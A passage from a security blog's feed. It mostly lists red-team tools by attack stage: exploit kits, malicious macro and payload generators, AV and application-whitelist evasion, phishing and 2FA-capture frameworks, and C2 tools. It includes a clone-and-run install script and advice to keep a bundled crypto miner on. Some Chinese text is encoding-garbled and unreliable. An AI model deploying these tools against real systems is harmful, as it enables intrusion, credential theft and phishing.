      &lt;h1 id=&quot;æ¼æ´å®‰å…¨çŸ¥è¯†Wiki&quot;&gt;&lt;a href=&quot;#æ¼æ´å®‰å…¨çŸ¥è¯†Wiki&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´å®‰å…¨çŸ¥è¯†Wiki&quot;&gt;&lt;/a&gt;æ¼æ´å®‰å…¨çŸ¥è¯†Wiki&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;æœ¬æ–‡ä»æ¼æ´ç±»å‹çš„ç»´åº¦è¿›è¡ŒçŸ¥è¯†ä½“ç³»çš„æ•´ç†ï¼ŒåŒ…å«äº†æ¼æ´ä»‹ç»ã€æ¼æ´å±å®³ã€æ”»å‡»æ¡ˆä¾‹ã€æ£€æµ‹æ–¹æ³•ã€è§£å†³æ–¹æ¡ˆçš„å†…å®¹ï¼Œéƒ¨åˆ†æ¼æ´ç±»å‹ä»ä»£ç å±‚äº†è§£æ­¤ç±»æ¼æ´åŸç†åŠä¿®å¤æ–¹æ³•ã€‚æŒç»­æ›´æ–°ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="å®‰å…¨çŸ¥è¯†" scheme="https://yaalonsong.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="å®‰å…¨çŸ¥è¯†" scheme="https://yaalonsong.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>linux å¸¸ç”¨å‘½ä»¤</title>
    <link href="https://yaalonsong.github.io/2019/04/08/Linux%20command.html"/>
    <id>https://yaalonsong.github.io/2019/04/08/Linux command.html</id>
    <published>2019-04-07T22:52:45.218Z</published>
    <updated>2019-04-07T22:56:40.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-å¸¸ç”¨å‘½ä»¤æ“ä½œ"><a href="#Linux-å¸¸ç”¨å‘½ä»¤æ“ä½œ" class="headerlink" title="Linux å¸¸ç”¨å‘½ä»¤æ“ä½œ"></a>Linux å¸¸ç”¨å‘½ä»¤æ“ä½œ</h1><blockquote><p>æ¸©æ•…è€ŒçŸ¥æ–°</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 `ps -ef|grep apache2|grep -v grep|awk &apos;&#123;print $2&#125;&apos; `</span><br><span class="line">æŒ‡å®šè¿›ç¨‹åæ‰§è¡Œ killå‘½ä»¤</span><br></pre></td></tr></table></figure><p><img src="/uploads/linux1.png" alt="1"></p><p><img src="/uploads/linux2.png" alt="2"></p><p><img src="/uploads/linux3.png" alt="3"></p><p><img src="/uploads/linux4.png" alt="4"></p><p><img src="/uploads/linux5.png" alt="5"></p><p><img src="/uploads/linux6.png" alt="6"></p><p><img src="/uploads/linux7.png" alt="7"></p><p><img src="/uploads/linux8.png" alt="8"></p><p><img src="/uploads/linux9.png" alt="9"></p><p><img src="/uploads/linux10.png" alt="10"></p><p><img src="/uploads/linux11.png" alt="11"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Linux-å¸¸ç”¨å‘½ä»¤æ“ä½œ&quot;&gt;&lt;a href=&quot;#Linux-å¸¸ç”¨å‘½ä»¤æ“ä½œ&quot; class=&quot;headerlink&quot; title=&quot;Linux å¸¸ç”¨å‘½ä»¤æ“ä½œ&quot;&gt;&lt;/a&gt;Linux å¸¸ç”¨å‘½ä»¤æ“ä½œ&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;æ¸©æ•…è€ŒçŸ¥æ–°&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="linux" scheme="https://yaalonsong.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://yaalonsong.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Redteam Toolkit</title>
    <link href="https://yaalonsong.github.io/2019/04/07/Redteam%20Toolkit.html"/>
    <id>https://yaalonsong.github.io/2019/04/07/Redteam Toolkit.html</id>
    <published>2019-04-07T15:26:56.325Z</published>
    <updated>2020-03-17T17:06:24.094Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/uploads/bBQ9aKm.png" alt="alt text"></p><a id="more"></a><p>This tool kit is very much influenced by infosecn1njaâ€™s kit.<br>Use this script to grab majority of the repos.</p><p><strong>NOTE: hard coded in /opt and made for Kali Linux</strong></p><p><strong>Total Size (so far): 2.5+Gb</strong></p><p>Install Guide:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/shr3ddersec/Shr3dKit.git</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">bash shr3dkit.sh</span><br></pre></td></tr></table></figure></p><p><strong>Change Log</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Fixed: macro_pack, LaZagne</span><br><span class="line">Code: Added all requirements to script, seperated pip requirements and merged to one file.</span><br><span class="line"></span><br><span class="line">Tools Added: Modlishka, pwndb, cat-sites, Phantom-Evasion</span><br></pre></td></tr></table></figure></p><p><strong>Phantom Evasion Forewarning</strong></p><p>Currently pursuing a permanent an IT Sec role, for personal budgeting I added this tool as does a fantastic job for AV Evasion without opening up your wallet. <em>Keep in mind, this does have crypto miner (xmr-stak) installer option. I kept the complete install out of script purposely for this reason</em>. To disable, please change <code>Miner=False</code> in Setup/Config.txt then run the script. You may always keep it on to help the devs, such as myself in my home lab.</p><h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#weaponization">Weaponization</a></li><li><a href="#delivery">Delivery</a></li><li><a href="#command-and-control">Command and Control</a></li><li><a href="#lateral-movement">Lateral Movement</a></li><li><a href="#establish-foothold">Establish Foothold</a></li><li><a href="#escalate-privileges">Escalate Privileges</a></li><li><a href="#data-exfiltration">Data Exfiltration</a></li><li><a href="#misc">Misc</a></li><li><a href="#references">References</a></li></ul><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><h3 id="Active-Intelligence-Gathering"><a href="#Active-Intelligence-Gathering" class="headerlink" title="Active Intelligence Gathering"></a>Active Intelligence Gathering</h3><ul><li><strong>EyeWitness</strong> is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. <a href="https://github.com/ChrisTruncer/EyeWitness" target="_blank" rel="noopener">https://github.com/ChrisTruncer/EyeWitness</a></li><li><strong>AWSBucketDump</strong> is a tool to quickly enumerate AWS S3 buckets to look for loot. <a href="https://github.com/jordanpotti/AWSBucketDump" target="_blank" rel="noopener">https://github.com/jordanpotti/AWSBucketDump</a></li><li><strong>AQUATONE</strong> is a set of tools for performing reconnaissance on domain names. <a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a></li><li><strong>spoofcheck</strong> a program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. <a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">https://github.com/BishopFox/spoofcheck</a></li><li><strong>Nmap</strong> is used to discover hosts and services on a computer network, thus building a â€œmapâ€ of the network. <a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></li><li><strong>dnsrecon</strong> a tool DNS Enumeration Script. <a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">https://github.com/darkoperator/dnsrecon</a></li></ul><h3 id="Passive-Intelligence-Gathering"><a href="#Passive-Intelligence-Gathering" class="headerlink" title="Passive Intelligence Gathering"></a>Passive Intelligence Gathering</h3><ul><li><strong>Social Mapper</strong> OSINT Social Media Mapping Tool, takes a list of names &amp; images (or LinkedIn company name) and performs automated target searching on a huge scale across multiple social media sites. Not restricted by APIs as it instruments a browser using Selenium. Outputs reports to aid in correlating targets across sites. <a href="https://github.com/SpiderLabs/social_mapper" target="_blank" rel="noopener">https://github.com/SpiderLabs/social_mapper</a></li><li><strong>skiptracer</strong> OSINT scraping framework, utilizes some basic python webscraping (BeautifulSoup) of PII paywall sites to compile passive information on a target on a ramen noodle budget. <a href="https://github.com/xillwillx/skiptracer" target="_blank" rel="noopener">https://github.com/xillwillx/skiptracer</a></li><li><strong>ScrapedIn</strong> a tool to scrape LinkedIn without API restrictions for data reconnaissance. <a href="https://github.com/dchrastil/ScrapedIn" target="_blank" rel="noopener">https://github.com/dchrastil/ScrapedIn</a></li><li><strong>linkScrape</strong> A LinkedIn user/company enumeration tool. <a href="https://github.com/NickSanzotta/linkScrape" target="_blank" rel="noopener">https://github.com/NickSanzotta/linkScrape</a></li><li><strong>FOCA</strong> (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. <a href="https://github.com/ElevenPaths/FOCA" target="_blank" rel="noopener">https://github.com/ElevenPaths/FOCA</a></li><li><strong>theHarvester</strong> is a tool for gathering subdomain names, e-mail addresses, virtual<br>hosts, open ports/ banners, and employee names from different public sources. <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></li><li><strong>Metagoofil</strong> is a tool for extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites. <a href="https://github.com/laramies/metagoofil" target="_blank" rel="noopener">https://github.com/laramies/metagoofil</a></li><li><strong>SimplyEmail</strong> Email recon made fast and easy, with a framework to build on. <a href="https://github.com/killswitch-GUI/SimplyEmail" target="_blank" rel="noopener">https://github.com/killswitch-GUI/SimplyEmail</a></li><li><strong>truffleHog</strong> searches through git repositories for secrets, digging deep into commit history and branches.  <a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a></li><li><strong>Just-Metadata</strong> is a tool that gathers and analyzes metadata about IP addresses. It attempts to find relationships between systems within a large dataset. <a href="https://github.com/ChrisTruncer/Just-Metadata" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Just-Metadata</a></li><li><strong>typofinder</strong> a finder of domain typos showing country of IP address. <a href="https://github.com/nccgroup/typofinder" target="_blank" rel="noopener">https://github.com/nccgroup/typofinder</a></li><li><strong>pwnedOrNot</strong> is a python script which checks if the email account has been compromised in a data breach, if the email account is compromised it proceeds to find passwords for the compromised account. <a href="https://github.com/thewhiteh4t/pwnedOrNot" target="_blank" rel="noopener">https://github.com/thewhiteh4t/pwnedOrNot</a></li><li><p><strong>GitHarvester</strong> This tool is used for harvesting information from GitHub like google dork. <a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p></li><li><p><strong>pwndb</strong> is a python command-line tool for searching leaked credentials using the Onion service with the same name. <a href="https://github.com/davidtavarez/pwndb/" target="_blank" rel="noopener">https://github.com/davidtavarez/pwndb/</a></p></li></ul><h3 id="Frameworks"><a href="#Frameworks" class="headerlink" title="Frameworks"></a>Frameworks</h3><ul><li><strong>Maltego</strong> is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. <a href="https://www.paterva.com/web7/downloads.php" target="_blank" rel="noopener">https://www.paterva.com/web7/downloads.php</a></li><li><strong>SpiderFoot</strong> the open source footprinting and intelligence-gathering tool. <a href="https://github.com/smicallef/spiderfoot" target="_blank" rel="noopener">https://github.com/smicallef/spiderfoot</a></li><li><strong>datasploit</strong> is an OSINT Framework to perform various recon techniques on Companies, People, Phone Number, Bitcoin Addresses, etc., aggregate all the raw data, and give data in multiple formats. <a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></li><li><strong>Recon-ng</strong> is a full-featured Web Reconnaissance framework written in Python. <a href="https://bitbucket.org/LaNMaSteR53/recon-ng" target="_blank" rel="noopener">https://bitbucket.org/LaNMaSteR53/recon-ng</a></li></ul><h2 id="Weaponization"><a href="#Weaponization" class="headerlink" title="Weaponization"></a>Weaponization</h2><ul><li><strong>Composite Moniker</strong> Proof of Concept exploit for CVE-2017-8570. <a href="https://github.com/rxwx/CVE-2017-8570" target="_blank" rel="noopener">https://github.com/rxwx/CVE-2017-8570</a></li><li><strong>Exploit toolkit CVE-2017-8759</strong> is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. <a href="https://github.com/bhdresh/CVE-2017-8759" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-8759</a></li><li><strong>CVE-2017-11882 Exploit</strong> accepts over 17k bytes long command/code in maximum. <a href="https://github.com/unamer/CVE-2017-11882" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882</a></li><li><strong>Adobe Flash Exploit</strong> CVE-2018-4878. <a href="https://github.com/anbai-inc/CVE-2018-4878" target="_blank" rel="noopener">https://github.com/anbai-inc/CVE-2018-4878</a></li><li><strong>Exploit toolkit CVE-2017-0199</strong> is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. <a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-0199</a></li><li><strong>demiguise</strong> is a HTA encryption tool for RedTeams. <a href="https://github.com/nccgroup/demiguise" target="_blank" rel="noopener">https://github.com/nccgroup/demiguise</a></li><li><strong>Office-DDE-Payloads</strong> collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique. <a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" target="_blank" rel="noopener">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a></li><li><strong>CACTUSTORCH</strong> Payload Generation for Adversary Simulations. <a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/CACTUSTORCH</a></li><li><strong>SharpShooter</strong> is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. <a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></li><li><strong>Donâ€™t kill my cat</strong> is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. <a href="https://github.com/Mr-Un1k0d3r/DKMC" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/DKMC</a></li><li><strong>Malicious Macro Generator Utility</strong> Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism. <a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a></li><li><strong>SCT Obfuscator</strong> Cobalt Strike SCT payload obfuscator. <a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a></li><li><strong>Invoke-Obfuscation</strong> PowerShell Obfuscator. <a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></li><li><strong>Invoke-DOSfuscation</strong> cmd.exe Command Obfuscation Generator &amp; Detection Test Harness. <a href="https://github.com/danielbohannon/Invoke-DOSfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-DOSfuscation</a></li><li><strong>morphHTA</strong> Morphing Cobalt Strikeâ€™s evil.HTA. <a href="https://github.com/vysec/morphHTA" target="_blank" rel="noopener">https://github.com/vysec/morphHTA</a></li><li><strong>Unicorn</strong> is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. <a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></li><li><strong>Shellter</strong> is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. <a href="https://www.shellterproject.com/" target="_blank" rel="noopener">https://www.shellterproject.com/</a></li><li><strong>EmbedInHTML</strong> Embed and hide any file in an HTML file. <a href="https://github.com/Arno0x/EmbedInHTML" target="_blank" rel="noopener">https://github.com/Arno0x/EmbedInHTML</a></li><li><strong>SigThief</strong> Stealing Signatures and Making One Invalid Signature at a Time. <a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></li><li><strong>Veil</strong> is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. <a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil</a></li><li><strong>CheckPlease</strong> Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. <a href="https://github.com/Arvanaghi/CheckPlease" target="_blank" rel="noopener">https://github.com/Arvanaghi/CheckPlease</a></li><li><strong>Invoke-PSImage</strong> is a tool to embeded a PowerShell script in the pixels of a PNG file and generates a oneliner to execute. <a href="https://github.com/peewpw/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/peewpw/Invoke-PSImage</a></li><li><strong>LuckyStrike</strong> a PowerShell based utility for the creation of malicious Office macro documents. To be used for pentesting or educational purposes only. <a href="https://github.com/curi0usJack/luckystrike" target="_blank" rel="noopener">https://github.com/curi0usJack/luckystrike</a></li><li><strong>ClickOnceGenerator</strong> Quick Malicious ClickOnceGenerator for Red Team. The default application a simple WebBrowser widget that point to a website of your choice. <a href="https://github.com/Mr-Un1k0d3r/ClickOnceGenerator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/ClickOnceGenerator</a></li><li><strong>macro_pack</strong> is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments. <a href="https://github.com/sevagas/macro_pack" target="_blank" rel="noopener">https://github.com/sevagas/macro_pack</a></li><li><strong>StarFighters</strong> a JavaScript and VBScript Based Empire Launcher. <a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">https://github.com/Cn33liz/StarFighters</a></li><li><strong>nps_payload</strong> this script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. <a href="https://github.com/trustedsec/nps_payload" target="_blank" rel="noopener">https://github.com/trustedsec/nps_payload</a></li><li><strong>SocialEngineeringPayloads</strong> a collection of social engineering tricks and payloads being used for credential theft and spear phishing attacks. <a href="https://github.com/bhdresh/SocialEngineeringPayloads" target="_blank" rel="noopener">https://github.com/bhdresh/SocialEngineeringPayloads</a></li><li><strong>The Social-Engineer Toolkit</strong> is an open-source penetration testing framework designed for social engineering. <a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit</a></li><li><strong>Phishery</strong> is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication.  <a href="https://github.com/ryhanson/phishery" target="_blank" rel="noopener">https://github.com/ryhanson/phishery</a></li><li><strong>PowerShdll</strong> run PowerShell with rundll32. Bypass software restrictions. <a href="https://github.com/p3nt4/PowerShdll" target="_blank" rel="noopener">https://github.com/p3nt4/PowerShdll</a></li><li><strong>Ultimate AppLocker ByPass List</strong> The goal of this repository is to document the most common techniques to bypass AppLocker. <a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a></li><li><strong>Ruler</strong> is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. <a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></li><li><strong>Generate-Macro</strong> is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method. <a href="https://github.com/enigma0x3/Generate-Macro" target="_blank" rel="noopener">https://github.com/enigma0x3/Generate-Macro</a></li><li><strong>Malicious Macro MSBuild Generator</strong> Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass. <a href="https://github.com/infosecn1nja/MaliciousMacroMSBuild" target="_blank" rel="noopener">https://github.com/infosecn1nja/MaliciousMacroMSBuild</a></li><li><strong>Meta Twin</strong> is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. <a href="https://github.com/threatexpress/metatwin" target="_blank" rel="noopener">https://github.com/threatexpress/metatwin</a></li><li><strong>WePWNise</strong> generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software. <a href="https://github.com/mwrlabs/wePWNise" target="_blank" rel="noopener">https://github.com/mwrlabs/wePWNise</a></li><li><strong>DotNetToJScript</strong> a tool to create a JScript file which loads a .NET v2 assembly from memory. <a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a></li><li><strong>PSAmsi</strong> is a tool for auditing and defeating AMSI signatures. <a href="https://github.com/cobbr/PSAmsi" target="_blank" rel="noopener">https://github.com/cobbr/PSAmsi</a></li><li><strong>Reflective DLL injection</strong> is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></li><li><strong>ps1encode</strong> use to generate and encode a powershell based metasploit payloads. <a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a></li><li><strong>Worse PDF</strong> turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines. <a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noopener">https://github.com/3gstudent/Worse-PDF</a></li><li><strong>SpookFlare</strong> has a different perspective to bypass security measures and it gives you the opportunity to bypass the endpoint countermeasures at the client-side detection and network-side detection. <a href="https://github.com/hlldz/SpookFlare" target="_blank" rel="noopener">https://github.com/hlldz/SpookFlare</a></li><li><strong>GreatSCT</strong> is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. <a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">https://github.com/GreatSCT/GreatSCT</a></li><li><strong>nps</strong> running powershell without powershell. <a href="https://github.com/Ben0xA/nps" target="_blank" rel="noopener">https://github.com/Ben0xA/nps</a></li><li><strong>Meterpreter_Paranoid_Mode.sh</strong> allows users to secure your staged/stageless connection for Meterpreter by having it check the certificate of the handler it is connecting to. <a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL" target="_blank" rel="noopener">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></li><li><strong>The Backdoor Factory (BDF)</strong> is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. <a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></li><li><strong>MacroShop</strong> a collection of scripts to aid in delivering payloads via Office Macros. <a href="https://github.com/khr0x40sh/MacroShop" target="_blank" rel="noopener">https://github.com/khr0x40sh/MacroShop</a></li><li><strong>UnmanagedPowerShell</strong> Executes PowerShell from an unmanaged process. <a href="https://github.com/leechristensen/UnmanagedPowerShell" target="_blank" rel="noopener">https://github.com/leechristensen/UnmanagedPowerShell</a></li><li><strong>evil-ssdp</strong> Spoof SSDP replies to phish for NTLM hashes on a network. Creates a fake UPNP device, tricking users into visiting a malicious phishing page. <a href="https://gitlab.com/initstring/evil-ssdp" target="_blank" rel="noopener">https://gitlab.com/initstring/evil-ssdp</a></li><li><strong>Ebowla</strong> Framework for Making Environmental Keyed Payloads. <a href="https://github.com/Genetic-Malware/Ebowla" target="_blank" rel="noopener">https://github.com/Genetic-Malware/Ebowla</a></li><li><strong>make-pdf-embedded</strong> a tool to create a PDF document with an embedded file. <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py" target="_blank" rel="noopener">https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py</a></li><li><strong>avet</strong> (AntiVirusEvasionTool) is targeting windows machines with executable files using different evasion techniques. <a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></li><li><strong>Phantom-Evasion</strong> Interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads). <a href="https://github.com/oddcod3/Phantom-Evasion" target="_blank" rel="noopener">https://github.com/oddcod3/Phantom-Evasion</a> <strong>WARNING</strong>: Please be aware this does install a Minero miner by default. This can be changed in the <strong>Setup</strong> folder and edit <strong>Config.txt</strong> and edit <em>Mining = False</em>. If you want to support the project and developers, I would recommend keeping on. </li></ul><h2 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h2><h3 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h3><ul><li><strong>King Phisher</strong> is a tool for testing and promoting user awareness by simulating real world phishing attacks. <a href="https://github.com/securestate/king-phisher" target="_blank" rel="noopener">https://github.com/securestate/king-phisher</a></li><li><strong>FiercePhish</strong> is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more. <a href="https://github.com/Raikia/FiercePhish" target="_blank" rel="noopener">https://github.com/Raikia/FiercePhish</a></li><li><strong>ReelPhish</strong> is a Real-Time Two-Factor Phishing Tool. <a href="https://github.com/fireeye/ReelPhish/" target="_blank" rel="noopener">https://github.com/fireeye/ReelPhish/</a></li><li><strong>Gophish</strong> is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training. <a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">https://github.com/gophish/gophish</a></li><li><strong>CredSniper</strong> is a phishing framework written with the Python micro-framework Flask and Jinja2 templating which supports capturing 2FA tokens. <a href="https://github.com/ustayready/CredSniper" target="_blank" rel="noopener">https://github.com/ustayready/CredSniper</a></li><li><strong>PwnAuth</strong> a web application framework for launching and managing OAuth abuse campaigns. <a href="https://github.com/fireeye/PwnAuth" target="_blank" rel="noopener">https://github.com/fireeye/PwnAuth</a></li><li><strong>Phishing Frenzy</strong> Ruby on Rails Phishing Framework. <a href="https://github.com/pentestgeek/phishing-frenzy" target="_blank" rel="noopener">https://github.com/pentestgeek/phishing-frenzy</a></li><li><strong>Phishing Pretexts</strong> a library of pretexts to use on offensive phishing engagements. <a href="https://github.com/L4bF0x/PhishingPretexts" target="_blank" rel="noopener">https://github.com/L4bF0x/PhishingPretexts</a></li><li><strong>Modlishka</strong> is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level. <a href="https://github.com/drk1wi/Modlishka" target="_blank" rel="noopener">https://github.com/drk1wi/Modlishka</a></li></ul><h3 id="Watering-Hole-Attack"><a href="#Watering-Hole-Attack" class="headerlink" title="Watering Hole Attack"></a>Watering Hole Attack</h3><ul><li><strong>BeEF</strong> is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. <a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></li></ul><h2 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h2><h3 id="Remote-Access-Tools"><a href="#Remote-Access-Tools" class="headerlink" title="Remote Access Tools"></a>Remote Access Tools</h3><ul><li><strong>Cobalt Strike</strong> is software for Adversary Simulations and Red Team Operations. <a href="https://cobaltstrike.com/" target="_blank" rel="noopener">https://cobaltstrike.com/</a></li><li><strong>Empire</strong> is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></li><li><strong>Metasploit Framework</strong> is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></li><li><strong>SILENTTRINITY</strong> A post-exploitation agent powered by Python, IronPython, C#/.NET. <a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/SILENTTRINITY</a></li><li><strong>Pupy</strong> is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python. <a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">https://github.com/n1nj4sec/pupy</a></li><li><strong>Koadic</strong> or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. <a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">https://github.com/zerosum0x0/koadic</a></li><li><strong>PoshC2</strong> is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. <a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">https://github.com/nettitude/PoshC2</a></li><li><strong>Gcat</strong> a stealthy Python based backdoor that uses Gmail as a command and control server. <a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></li><li><strong>TrevorC2</strong> is a legitimate website (browsable) that tunnels client/server communications for covert command execution. <a href="https://github.com/trustedsec/trevorc2" target="_blank" rel="noopener">https://github.com/trustedsec/trevorc2</a></li><li><strong>Merlin</strong> is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang. <a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></li><li><strong>Quasar</strong> is a fast and light-weight remote administration tool coded in C#. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. <a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></li></ul><h3 id="Staging"><a href="#Staging" class="headerlink" 